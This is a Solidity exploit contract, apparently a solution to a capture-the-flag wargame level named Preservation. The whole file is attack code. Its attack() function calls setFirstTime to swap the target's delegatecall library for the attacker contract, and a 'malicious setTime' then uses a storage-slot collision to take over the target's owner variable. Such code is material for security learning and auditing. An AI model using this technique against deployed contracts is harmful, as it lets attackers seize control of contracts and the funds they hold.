// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract LibraryAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // the state variables: owner and signature are not important
    // we only care about the first 3

    Preservation preservation;
    address eve;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
        eve = msg.sender;
    }

    function attack() public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(address(eve))));
    }

    // a malicious setTime function
    function setTime(uint256 _owner) public {
        owner = address(uint160(uint256(_owner)));
    }
}
